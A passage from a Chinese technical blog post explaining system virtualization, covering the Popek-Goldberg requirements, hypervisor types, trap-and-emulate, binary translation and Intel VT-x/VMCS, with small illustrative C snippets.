资源，<strong>至于用户拿到这个计算资源后要做什么笔者并不关心</strong>（笑）</p></blockquote><h1 id="0x02-系统虚拟化概述"><a href="#0x02-系统虚拟化概述" class="headerlink" title="0x02. 系统虚拟化概述"></a>0x02. 系统虚拟化概述</h1><h2 id="一、基本模型"><a href="#一、基本模型" class="headerlink" title="一、基本模型"></a>一、基本模型</h2><p>对于一台计算机，我们可以简单地抽象成下图所示的三层模型，从下往上分别是<strong>物理硬件层、操作系统层、应用程序层</strong>：</p><p><img src="https://s2.loli.net/2022/08/02/5jwhR2HnDTCp3q8.png" alt="image.png"></p><p>我们首先给「虚拟机」下一个定义：</p><ul><li><strong>虚拟机</strong>（Virtual Machine）是计算机的虚拟化实例，拥有自己的虚拟硬件（如 CPU、内存、设备等），可执行与计算机几乎完全相同的功能，包括运行应用和操作系统</li></ul><p>即我们可以把一个虚拟机实例看作是一台具有如上图所示层次的<strong>逻辑的计算机</strong></p><p>但虚拟机的运行是需要有物理环境所支撑的，同时虚拟机实例也是不可能凭空出现&#x2F;凭空消失的，因此接下来我们引入一个新的概念——<strong>VMM</strong>，即 <code>Virtual Machine Monitor</code>，又称 <code>Hypervisor</code>，这是一个介于 VM 与硬件中间的软件层，<strong>其负责 VM 的创建、销毁等工作，并为 VM 提供了运行环境</strong>：「虚拟硬件抽象层」</p><p><img src="https://s2.loli.net/2022/08/05/C4czg3kVIKAJb5L.png" alt="image.png"></p><p>1974年，Gerald J. Popek 与 Robert P. Goldberg 发表了合作论文<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">《Formal Requirements for Virtualizable Third Generation Architectures》</a>，在论文中提出了满足虚拟化系统结构的 VMM 的三个充分条件，称之为<code>Popek and Goldberg virtualization requirements</code>：</p><ul><li><strong>等价性</strong>（essentially identical）：一个运行于 VMM 下的程序，<strong>其行为应与直接运行于等价物理机上的同程序的行为完全一致</strong></li><li><strong>资源控制</strong>（resource control）：VMM 对虚拟资源具有<strong>完全的控制能力</strong>，包括资源的分配、监控、回收</li><li><strong>效率性</strong>（efficiency）：机器指令中经常使用的那一部分应在没有 VMM 干预下<strong>直接在硬件上执行</strong></li></ul><p>由此，论文中提出了两种 Hypervisor 方案，这也成为了现在最主流的两种方案：</p><ul><li><p><code>Type I</code> ：<strong>Hypervisor 直接运行在硬件上，即以 Hypervisor 作为 Host OS 直接管控硬件资源</strong>。例如 <code>VMware ESXI</code> 便是采用此种架构的 Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/Mn2cKxtpXdibHRG.png" alt="image.png"></p></li><li><p><code>Type II</code>：<strong>Hypervisor 运行在传统的操作系统上，与其他应用程序并行运行</strong>。例如 <code>Qemu</code> 与 <code>VMware Player</code> 便是采用此种架构的 Hypervisor</p><p><img src="https://s2.loli.net/2022/08/03/FNComsjbSdTheL6.png" alt="image.png"></p></li></ul><p>具体到技术细节上，我们应该如何去实现上述的虚拟化方案呢？我们先来介绍一个概念——「敏感指令」，即<strong>操作特权资源的指令</strong>，例如 IO 操作、修改页表寄存器等</p><p>为了我们的 VMM 能够完全地控制系统资源，<strong>敏感质量必须在 VMM 的监控审查下完成，或是经由 VMM 来完成</strong>。因此，若一个架构中所有的特权指令都是敏感质量，则我们可以使用<strong>特权级压缩</strong>（Ring Compression）的方式来实现虚拟环境：</p><ul><li>VMM 运行在最高特权级上，Guest VM 运行在低特权级上，当 Guest VM 执行到敏感指令时，其便会陷入位于最高特权级的 VMM，此时便能由 VMM 模拟敏感指令的行为</li></ul><p>——这就是系统虚拟化最典中典的模型<strong>「Trap &amp; Emulate」</strong>：</p><ul><li>我们将操作系统分为两个运行模式：「用户模式（user mode）」与「特权模式（privileged mode）」，在用户模式下只能直接执行非特权指令，当执行到特权指令时便会触发异常，从而陷入特权模式对应的处理代码中</li><li>Guest VM 运行在用户模式下，从而使得普通指令可以直接放在 CPU 上执行，当 Guest VM 执行到<strong>敏感指令</strong>时，便会<strong>触发异常，此时由 VMM 介入并模拟其应有的行为</strong></li></ul><p>因此，一个 ISA 是否可以虚拟化，其核心就在于<strong>敏感指令是否都是特权指令</strong></p><p><img src="https://s2.loli.net/2022/08/04/cipfjY89LsgIlVb.png" alt="知乎偷的图"></p><p>而由于硬件实体资源也有着不同的类型，我们将对不同类型实体资源的虚拟化技术分为如下类型：</p><ul><li>CPU 虚拟化</li><li>内存虚拟化</li><li>I&#x2F;O 虚拟化</li></ul><h2 id="二、遇到的问题"><a href="#二、遇到的问题" class="headerlink" title="二、遇到的问题"></a>二、遇到的问题</h2><p>在虚拟化技术的发展初期，在个人计算机领域广泛使用的 x86 架构并没有对虚拟化的经典架构「Trap &amp; Emulate」提供很好的支持，存在着对系统虚拟化的支持缺陷，<strong>系统虚拟化并不能直接而有效的实现</strong></p><p>Intel 分级保护环将权限分为 ring0~ ring3，其中操作系统内核运行在 ring0 权限而用户进程运行在 ring3 权限</p><p><img src="https://i.loli.net/2021/02/22/yQXZhLEHVn1b3uC.png"></p><p>在系统虚拟化的经典架构「Trap &amp; Emulate」中， Guest OS 全部运行在 ring3，当涉及到一些敏感指令时，VM 触发 General Protection 异常，由 VMM 进行截获并处理，<strong>但不是所有敏感指令都是特权指令，不是所有的敏感指令都有触发异常以让 VMM 介入的机会</strong>， x86 架构中<strong>一共有 17 条非特权敏感指令</strong>：</p><p><img src="https://s2.loli.net/2022/08/04/qirIbepFOA4U5xf.png" alt="image.png"></p><p>这些指令<strong>直接违反了 <code>Popek and Goldberg virtualization requirements</code> ，从而使得 x86 不是一个可以虚拟化的架构</strong></p><blockquote><p>例如在 x86 下我们想要用 popf 修改 eflags 的中断开关位（IF）时，若我们在用户态下进行这样的操作，<strong>则会直接被硬件所忽视，而不会引起异常</strong>，这令 VMM 无法介入</p></blockquote><p>“硬件不够，软件来凑”。因此在硬件还未提供对虚拟化的足够支持之前，Hypervisor 只能从软件层面下功夫，于是出现了两种纯软件虚拟化技术：「模拟执行」（VMWare）与「直接源代码改写」（Xen）</p><p>在软件虚拟化技术已经发展成熟多年之后，x86 架构对虚拟化的支持才姗姗来迟：「硬件辅助虚拟化」（Intel VT）开始出现在人们的视野当中</p><h2 id="三、实现方案"><a href="#三、实现方案" class="headerlink" title="三、实现方案"></a>三、实现方案</h2><h3 id="I-完全虚拟化（Full-virtualization）"><a href="#I-完全虚拟化（Full-virtualization）" class="headerlink" title="I.完全虚拟化（Full-virtualization）"></a>I.完全虚拟化（Full-virtualization）</h3><p>完全虚拟化技术提供一个<strong>完整的虚拟化硬件环境</strong>，允许<strong>未经修改的 Guest OS 直接在 VM 上运行</strong>，在 Guest OS 的视角，其与运行在真实的物理平台上一般无二</p><p>完全虚拟化意味着 Guest OS 会将操作正常的处理器、内存、I&#x2F;O 设备那样在虚拟化硬件环境中操作，因此这需要 VMM 能够正确处理 Guest OS 所有可能的行为，因此这需要对应的架构满足 <code>Popek and Goldberg virtualization requirements</code></p><p>由于 x86 架构的硬件在最初并没有对虚拟化提供很好的支持，因此完全虚拟化经历了两个阶段：</p><h4 id="1）「软件辅助的完全虚拟化」"><a href="#1）「软件辅助的完全虚拟化」" class="headerlink" title="1）「软件辅助的完全虚拟化」"></a>1）「软件辅助的完全虚拟化」</h4><p>纯软件实现的完全虚拟化主要依赖两个技术：</p><ul><li><strong>「优先级压缩」</strong>（Ring Compression）：<strong>即 VMM 与 GUest VM 运行在不同的特权级上</strong>。例如 <code>VMM 运行在 ring0、Guest OS kernel 运行在 ring1、Guest APP 运行在 ring3 </code>，当 Guest OS 想要尝试执行特权指令时，便会触发异常，此时 VMM 便能截获该特权指令并进行模拟执行。但正如我们前面所说，<strong>不是所有敏感指令都是特权指令</strong>，这使得部分敏感指令无法被 VMM 截获并处理，从而导致了虚拟化平台与物理平台表现的行为不一致</li><li><strong>「二进制代码翻译」</strong>（Binary Translation）：二进制代码翻译被引入来<strong>处理对虚拟化不友好的指令</strong>，其思想便是扫描并修改 Guest VM 的二进制代码，将难以虚拟化的指令转化为支持虚拟化的指令（例如显式地触发异常让 VMM 得以介入），对于非敏感指令则仍是直接执行。这在确保了性能的情况下实现了完全虚拟化</li></ul><p><img src="https://s2.loli.net/2022/08/05/AqLhpontmYHCS8T.png" alt="image.png"></p><blockquote><p> VMware 与 Qemu 便都是采用了二进制代码翻译的支持完全虚拟化的虚拟机软件，不过最初的 Qemu 更类似于【解释执行】的模式</p></blockquote><p>虽然在优先级压缩与二进制代码翻译技术的配合下 x86 架构成功地实现了完全虚拟化，但是这种“打补丁”的方式很难在架构上保证完整性，因此 x86 厂商最终在硬件上加入了对虚拟化的支持，从硬件架构层面实现了完全虚拟化</p><h4 id="2）「硬件辅助的完全虚拟化」"><a href="#2）「硬件辅助的完全虚拟化」" class="headerlink" title="2）「硬件辅助的完全虚拟化」"></a>2）「硬件辅助的完全虚拟化」</h4><p>在纯软件虚拟化技术发展多年后，x86 架构对虚拟化的支持终于姗姗来迟：Intel 与 AMD 分别推出了自家的硬件虚拟化技术 Intel VT 与 AMD-v，在硬件层面添加了对虚拟化的支持，使得 x86 架构终于成为一个符合 <code>Popek and Goldberg virtualization requirements</code>的 ISA（Infrastructure Set Architecture），从而得以实现完全虚拟化</p><p>硬件辅助虚拟化本质上是通过在 Guest OS 与硬件中间再添加一个 VMM 中间层来实现的，<strong>由硬件负责截获 OS 对敏感指令的执行与对敏感资源的访问，并通过异常的方式报告给 VMM</strong>，从而从硬件层面实现了 <code>Popek and Goldberg virtualization requirements</code></p><p><img src="https://s2.loli.net/2022/08/05/1rfEzK89DG6Moml.png" alt="image.png"></p><p>以 <code>Intel VT-x</code> 技术为例，其在硬件架构上将 CPU 的运行模式分为两种：<strong>「Non-Root Mode」与「Root Mode」</strong>，这两个运行模式都有着各自的分级保护环，其中 Host OS 与 VMM 运行在 Root Mode 下而 Guest OS 则运行在 Non-Root Mode 下</p><p>Root Mode 与原有的运行模式一般无二，在 Non-Root Mode下非敏感指令可以直接在硬件上执行，当 Guest OS 运行了敏感指令时，硬件便会捕获到这一行为，切换到 Root Mode 并将之报告给 VMM，由 VMM 处理好后再恢复到 Non-Root Mode 中继续 Guest OS 的运行，<strong>这从硬件层面实现了「Trap &amp; Emulate」模型</strong></p><p><img src="https://s2.loli.net/2022/08/05/n9TRrsCkKZvGE3U.png" alt="image.png"></p><h3 id="II-半虚拟化（Para-virtualization）"><a href="#II-半虚拟化（Para-virtualization）" class="headerlink" title="II.半虚拟化（Para-virtualization）"></a>II.半虚拟化（Para-virtualization）</h3><p>半虚拟化技术最初的目的也是为了解决 x86 架构无法实现经典虚拟化架构的问题，其<strong>通过修改操作系统内核的代码，使得操作系统内核完全避免这些难以虚拟化的指令</strong>，从而在 x86 架构下实现虚拟化。在半虚拟化技术中，Guest OS 能够感知到自己运行在虚拟化环境中，当涉及到敏感指令的执行或是对敏感资源的访问时，Guest OS 通过名为 <code>Hypercall</code> 的 API 陷入 VMM 中（通常通过陷阱等方式实现），由 VMM 进行相应的操作后再重新返回 VM 中的 Guest OS 继续执行</p><p><img src="https://s2.loli.net/2022/08/05/MhAJEnmCSBzoUVW.png" alt="image.png"></p><blockquote><p>Xen 便是采用了这一模式的虚拟化软件</p></blockquote><p>半虚拟化需要对 OS kernel 的代码进行<strong>大量的修改</strong>，从而使得其支持半虚拟化技术，因此 Windows 这样的闭源操作系统最初是不支持半虚拟化的</p><h2 id="四、libvirt"><a href="#四、libvirt" class="headerlink" title="四、libvirt"></a>四、libvirt</h2><p>众所周知系统虚拟化平台不止一种（VMWare、Xen、KVM、…），管理起来较为麻烦，因此 <strong>libvirt</strong> 应运而生</p><p><code>libvirt</code> 是一个<strong>专门用于管理虚拟化平台的工具包</strong>，其提供了用于管理硬件虚拟化的<strong>开源API</strong>（libvirt API）、<strong>守护进程</strong>（libvirtd）与<strong>管理工具</strong>（virsh），可以用于管理现在主流的大部分 VMM：</p><p><img src="https://s2.loli.net/2022/08/08/tUSvuapWKl6dx9z.png" alt="image.png"></p><h1 id="0x03-CPU-虚拟化"><a href="#0x03-CPU-虚拟化" class="headerlink" title="0x03. CPU 虚拟化"></a>0x03. CPU 虚拟化</h1><p>CPU 虚拟化是系统虚拟化技术中最核心的部分，因为 CPU 是计算机中最核心的组件，直接控制着整个系统的运行，同时内存访问（内存虚拟化）与 I&#x2F;O 操作（I&#x2F;O虚拟化）也都直接依赖于 CPU，因此 CPU 虚拟化是系统虚拟化技术中的核心</p><p>在 Gerald J. Popek 与 Robert P. Goldberg 的合作论文<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">《Formal Requirements for Virtualizable Third Generation Architectures》</a> 中提出了满足虚拟化系统结构的 VMM 的三个充分条件：等价性，资源控制，效率性。为了满足这个条件， CPU 虚拟化使用的经典模型是「Trap &amp; Emulate」，使用<strong>特权级压缩</strong>（Ring Compression）的方式来实现虚拟环境：</p><ul><li>Hypervisor 运行在最高特权级上，Guest VM 运行在低特权级上，Guest VM 在硬件上直接执行非敏感指令，当 Guest VM 执行到敏感指令时，其便会陷入位于最高特权级的 Hypervisor ，此时便能由 Hypervisor 模拟敏感指令的行为</li><li>当发生 virtual CPU 调度时，我们将 vCPU 的状态保存，恢复 Hypervisor 状态，Hypervisor 完成其行为后进行下一 virtual CPU 的调度，恢复下一 vCPU 的状态并恢复执行</li></ul><p><img src="https://s2.loli.net/2022/08/11/SvO9ewNdxIbsLqV.png" alt="image.png"></p><h2 id="一、纯软件实现虚拟化"><a href="#一、纯软件实现虚拟化" class="headerlink" title="一、纯软件实现虚拟化"></a>一、纯软件实现虚拟化</h2><p>前文我们已经指出 x86 架构存在<strong>非特权敏感指令，直接导致 VMM 无法截获 x86 VM 的敏感行为</strong>，这违反了<code>Popek and Goldberg virtualization requirements</code>，因此在硬件对虚拟化的支持出现之前，虚拟化厂商只好先从软件层面下手</p><h3 id="I-模拟-amp-解释执行"><a href="#I-模拟-amp-解释执行" class="headerlink" title="I. 模拟 &amp; 解释执行"></a>I. 模拟 &amp; 解释执行</h3><p><strong>「模拟」</strong>（Emulate）技术的出现其实早于虚拟化，纯软件的模拟本质上就是通过编写能够呈现出与被模拟对象相同行为的应用程式从而达到运行非同构平台应用程序的效果</p><p>模拟技术不仅能够应用于程序级别的模拟，还能应用于系统级别的模拟：CPU 运行的本质行为其实就是<strong>从 PC 寄存器所指内存区域中不断取出指令解码执行</strong>，我们不难想到的是，实现一个虚拟机最简单粗暴的方法便是通过<strong>模拟每一条指令对应的行为，从而使得 VM 的行为对 VMM 而言是完全可控的</strong></p><blockquote><p>例如，对于 <code>mov rax, rbx</code> 这样的指令，我们可以使用下面的程序来模拟：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">x86_regs</span>&#123;</span><br>    <span class="hljs-type">uint64_t</span> rax;<br>    <span class="hljs-type">uint64_t</span> rbx;<br>    <span class="hljs-type">uint64_t</span> rcx;<br>    <span class="hljs-type">uint64_t</span> rdx;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_regs</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> *to, <span class="hljs-type">uint64_t</span> *from)</span><br>&#123;<br>    *to = *from;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_rax_rbx</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> x86_regs *regs)</span><br>&#123;<br>    mov_regs(&amp;regs-&gt;rax, &amp;regs-&gt;rbx);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>实现模拟技术的原理也是最简单的——我们可以通过<strong>「解释执行」</strong>的方式来实现模拟技术：</p><ul><li>模拟器程序不断地从内存中读取指令，并模拟出每一条指令的效果，周而复始</li></ul><p>这样，从某种程度而言，<strong>每一条指令在执行时都完成了“陷入”</strong>，因此我们可以使用模拟技术解决虚拟化的漏洞，同时还能模拟与物理机不同架构的虚拟机</p><p><img src="https://s2.loli.net/2022/08/12/ZCSrkJIfeihDRwF.png" alt="image.png"></p><p><strong>Qemu</strong>——<code>Quick Emulator</code> 本质上便是一个模拟器，其<strong>完整地模拟了一套包括各种外设在内的计算机系统</strong></p><blockquote><p>例如以下便是笔者实现的一个最最最最简陋的模拟器架构，实际的架构会比这复杂得多：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CPU</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">regs</span> <span class="hljs-title">regs</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">cpu</span>[];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">memory</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus</span> *<span class="hljs-title">bus</span>;</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start_a_new_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> disk *disk)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span> <span class="hljs-title">vm</span> =</span> new_vm(<span class="hljs-string">&quot;x86&quot;</span>, disk);<br>    <br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruction</span> <span class="hljs-title">insn</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exec_result</span> <span class="hljs-title">res</span>;</span><br>        <br>        fetch_next_insn(vm, &amp;insn);<br>        vm_exec_insn(vm, &amp;insn, &amp;res);<br><br>        <span class="hljs-keyword">switch</span> (res.type) &#123;<br>            <span class="hljs-keyword">case</span> EXIT_VM:<br>                vm_stop(vm);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> RESOURCE_ACCESS:<br>                vm_access_resource(vm, &amp;res);<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>不过基于解释执行的模拟技术有着一个非常致命的缺点——<strong>性能极差</strong>，因为每一条指令都需要经过 VMM 的解析后再由 VMM 模拟执行，哪怕最简单的一条指令也可能需要分解成多个步骤与多次内存访问，效率极低</p><p>让我们重新审视我们为什么需要在 x86 架构上使用模拟技术来实现虚拟机：非特权敏感指令的存在打破了 <code>Popek and Goldberg virtualization requirements</code>，但<strong>非特权敏感指令仅是少数，大部分指令我们仍能直接在物理硬件上运行</strong>，因此基于模拟技术进行改进的虚拟化技术出现了：<code>扫描 &amp; 修补</code> 与 <code>二进制翻译</code></p><h3 id="II-扫描-amp-修补"><a href="#II-扫描-amp-修补" class="headerlink" title="II. 扫描 &amp; 修补"></a>II. 扫描 &amp; 修补</h3><p>虚拟化场景下的虚拟机大都是与物理机有着相同的 ISA，因此我们并没有必要采用纯模拟的技术实现虚拟机，而是可以<strong>让非敏感指令直接在硬件上执行，通过某种方式让非特权敏感指令陷入 VMM</strong>，从而重新实现 Trap &amp; Emulate 模型</p><p><strong>「扫描 &amp; 修补」</strong>便是这样的一种技术，其<strong>让非敏感指令直接在硬件上执行</strong>，同时<strong>将系统代码中的敏感指令替换为跳转指令等能陷入 VMM 中的指令</strong>，从而让 VM 在执行敏感指令时能陷入 VMM，使得 VMM 能够模拟执行敏感指令的效果</p><p>「扫描 &amp; 修补」的基本执行流程如下：</p><ul><li>VMM 在 VM 执行每段代码之前对其进行扫描，解析每一条指令，查找特权与敏感指令</li><li>VMM 动态生成相应指令的补丁代码，并将原敏感指令替换为一个外跳转以陷入 VMM，从而在 VMM 中执行动态生成的补丁代码</li><li>补丁代码执行结束后，再跳转回 VM 中继续执行下一条代码</li></ul><p><img src="https://s2.loli.net/2022/08/12/3ZlrC9zkLpJIvGO.png" alt="image.png"></p><blockquote><p>例如这是 VirtualBox 中对 <code>cli</code> 指令进行模拟的代码：</p><p><img src="https://s2.loli.net/2022/08/12/IFMhNz16xSneOq4.png" alt="image.png"></p></blockquote><p>在「扫描 &amp; 修补」技术当中大部分的代码都可以直接在物理 CPU 上运行，其性能损失较小，但「扫描 &amp; 修补」同样存在着一定的缺陷：</p><ul><li><p>特权指令与敏感指令仍通过模拟执行的方式完成，仍可能造成一定的性能损失</p></li><li><p>代码补丁当中引入了额外的跳转，这破坏了代码的局部性</p><blockquote><p>局部性原理：CPU存取指令&#x2F;数据的内存单元应当趋向于聚集在一个较小的区域</p></blockquote></li><li><p>VMM 需要维护一份补丁代码对应的原始代码的副本，这造成了额外的开销</p></li></ul><h3 id="III-二进制翻译"><a href="#III-二进制翻译" class="headerlink" title="III. 二进制翻译"></a>III. 二进制翻译</h3><p>为了进一步地提高虚拟化的性能，<strong>「二进制代码翻译」</strong>（Binary Translation）技术应运而生，类似于「扫描 &amp; 修补」技术，二进制代码翻译同样会在运行时动态地修改代码，不过不同的是 BT 技术以<strong>基本块</strong>（只有一个入口和一个出口的代码块）作为翻译的单位：</p><ul><li>Emulator 对读入的二进制代码<strong>翻译</strong>输出为对应 ISA 的一个<strong>不包含特权指令与敏感指令的子集</strong>所构成的代码，使其可以在用户态下安全运行</li><li>Emulator 动态地为当前要运行的基本块开辟一块空间，称之为<strong>翻译缓存</strong>（translation cache），在其中存放着翻译后的代码，每一块 TC 与原代码以某种映射关系（例如哈希表）进行关联</li></ul><p><img src="https://s2.loli.net/2022/08/14/hBFr6MSf5ZvtJkH.png" alt="image.png"></p><blockquote><p>我们可以看出二进制代码翻译技术与扫描修补技术的原理大体上是非常类似的，但是二进制代码翻译技术会对所有的代码进行翻译，而扫描与修补技术则只会 patch 掉敏感指令与特权指令；同时扫描&amp;修补技术<strong>不会改变代码的整体结构</strong>，而仅是将敏感与特权指令替换为能触发陷入 VMM 的指令，但是二进制代码翻译技术<strong>会直接改变一个基本块的代码整体结构</strong>（例如翻译前基本块可能长度 40B，翻译后变成100B，内部代码的相对位置也会发生变化）</p></blockquote><p>Emulator 的翻译方法大致分为两类：<strong>简单翻译</strong>与<strong>等值翻译</strong>：</p><ul><li>简单翻译可以直接理解为<strong>等效代码模拟</strong>。这种方法实现较为简单，但是会让指令数量大幅膨胀</li><li>等值翻译则是<strong>原代码与结果代码相同</strong>。理论上大多数指令都可以使用等值翻译直接在硬件上执行，但这需要更复杂的动态分析技术</li></ul><p>在相同 ISA 架构上大部分指令都是可以直接进行等值翻译的，除了以下几种：</p><ul><li>PC 相对寻址指令。这类指令的寻址与 PC 相关，但在进行二进制翻译后更改了代码基本块的结构，因此这类指令需要额外插入一些补偿代码来确保寻址的准确，这造成了一定的性能损失</li><li>直接控制转换。这类指令包括函数调用与跳转指令，其目标地址需要被替换为生成代码的地址</li><li>间接控制转换。这类指令包括间接调用、返回、间接跳转，其目标地址是在运行时动态得到的，因此我们无法在翻译时确定跳转目标</li><li>特权指令。对于简单的特权指令可以直接翻译为类似的等值代码（例如 cli 指令可以直接翻译为置 vcpu 的 flags 寄存器的 IF 位为0），但对于稍微复杂一点的指令，则需要进行深度模拟，利用跳转指令陷入 VMM 中，这通常会造成一定的性能开销</li></ul><blockquote><p>例如这是 Qemu 中的一个基本块代码翻译的例子：</p><p><img src="https://s2.loli.net/2022/08/14/ZSNn8iyCG9Tove6.png" alt="image.png"></p></blockquote><p>由于二进制代码翻译技术使用了更为复杂的过程，由此也会引入更多的问题，对于以下情形则需要额外的处理：</p><ul><li>自修改代码（Self Modifying Code）。这类程序会在运行时修改自身所执行的代码，这需要我们的 Emulator 对新生成的代码进行重翻译</li><li>自参考代码（Self Referential Code）。这类程序会在运行中读取自己的代码段中内容，这需要我们额外进行处理，使其读取原代码段中内容而非翻译后的代码</li><li>精确异常（Precise Exceptions）。即在翻译代码执行的过程中发生了中断或异常，这需要将运行状态恢复到原代码执行到异常点时的状态，之后再交给 Guest OS 处理。BT 技术暂很难很好地处理这种情况，因为翻译后的代码与原代码已经失去了逐条对应的关系。一个可行的解决方案就是在发生异常时进行回滚，之后重新使用解释执行的方式</li><li>实时代码。这类代码对于实时性要求较高，在模拟环境下运行会损失时间精确性，目前暂时无法解决</li></ul><h2 id="二、硬件辅助虚拟化-Intel-VT-x"><a href="#二、硬件辅助虚拟化-Intel-VT-x" class="headerlink" title="二、硬件辅助虚拟化 - Intel VT-x"></a>二、硬件辅助虚拟化 - Intel VT-x</h2><blockquote><p><del>听说硬件辅助虚拟化一出来 Xen 就没人用了</del></p></blockquote><h3 id="I-概述"><a href="#I-概述" class="headerlink" title="I. 概述"></a>I. 概述</h3><p>Intel VT 技术是 Intel 为 x86 虚拟化所提供的硬件支持，其中用于辅助 CPU 虚拟化的是 <code>Intel VT-x</code> 技术，其扩展了传统的 IA32 处理器架构，为 IA32 架构的 CPU 虚拟化提供了硬件支持</p><p>VT-x 技术为 Intel CPU 额外引入了两种运行模式，统称为<strong>「VMX 操作模式」</strong>（Virtual Machine eXtensions），通过 <code>vmxon</code> 指令开启，这两种运行模式<strong>都独立有着自己的分级保护环</strong>：</p><ul><li><code>VMX Root Operation</code>：Hypervisor 所工作的模式，在这个模式下可以访问计算机的所有资源，并对 VM 进行调度</li><li><code>VMX Non-Root Operation</code>：VM 所工作的模式，在这个模式下仅能访问非敏感资源，对于敏感资源的访问（例如 I&#x2F;O 操作）会使得 CPU 退出 Non-Root 模式并陷入 Hypervisor 中，由 Hypervisor 处理后再重新进入 Non-Root 模式恢复 VM 的运行</li></ul><p>由此，我们对 Root 模式与 Non-Root 模式间的切换行为进行定义：</p><ul><li><code>VM-Entry</code>：Hypervisor 保存自身状态信息，切换到 VMX Non-Root 模式，载入 VM 状态信息，恢复 VM 执行流</li><li><code>VM-Exit</code>：VM 运行暂停并保存自身状态信息，切换到 VMX Root 模式，载入 Hypervisor 状态信息，执行相应的处理函数</li></ul><p><img src="https://s2.loli.net/2022/08/11/uzmNXaOP6HSVqFL.png" alt="image.png"></p><p>由于 Non-Root 模式与 Root 模式都各自有着自己的分级保护环，因此 Host OS 与 Guest OS 都可以<strong>不加修改地在自己对应的模式下直接在硬件上运行</strong>，仅有当 Guest OS 涉及到敏感资源的访问及 Host OS 对 VM 的调度时才会发生切换，这在确保了 VM 高性能的同时满足了「Trap &amp; Emulate」模型实现，也解决了 x86 架构的虚拟化漏洞</p><h3 id="II-VMCS"><a href="#II-VMCS" class="headerlink" title="II. VMCS"></a>II. VMCS</h3><p>在 Intel VT-x 技术引入了<code>VMCS</code>（<strong>Virtual-Machine Control Structure</strong>），用以保存 CPU 虚拟化所需要的相关状态，<strong>每个 virtual CPU 对应有一个 VMCS</strong></p><p>VMCS 与物理 CPU 是<strong>一一对应的绑定关系</strong>，即在同一时刻一个物理 CPU 只能与一个 VMCS 绑定，反之亦然，但在不同的时刻我们可以将 VMCS 绑定到不同的物理 CPU 上，称之为 VMCS 的<strong>迁移</strong>（Migration）</p><p>与 VMCS 的绑定与解绑相关的是以下两条指令：</p><table><thead><tr><th align="center">Instruction</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">VMPTRLD &lt;VMCS 地址&gt;</td><td align="center">将指定的 VMCS 与执行该指令的 CPU 进行绑定</td></tr><tr><td align="center">VMCLEAR</td><td align="center">将执行该指令的 CPU 与其 VMCS 进行解绑</td></tr></tbody></table><p>VT-x 中将 VMCS 定义为一个<strong>最大不超过 4KB 的内存块，且应与 4KB 对齐</strong>，其内容格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCS</span> &#123;</span><br>    <span class="hljs-comment">/* 版本号，4字节 */</span><br><span class="hljs-type">uint32_t</span> vmcs_revision_identifier:<span class="hljs-number">31</span>, shadow_vmcs_indicator:<span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">/* 中止标识，4字节</span><br><span class="hljs-comment">     * 当 VM-Exit 失败时便会产生 VMX 中止，并在此处存放原因</span><br><span class="hljs-comment">     */</span><br>    <span 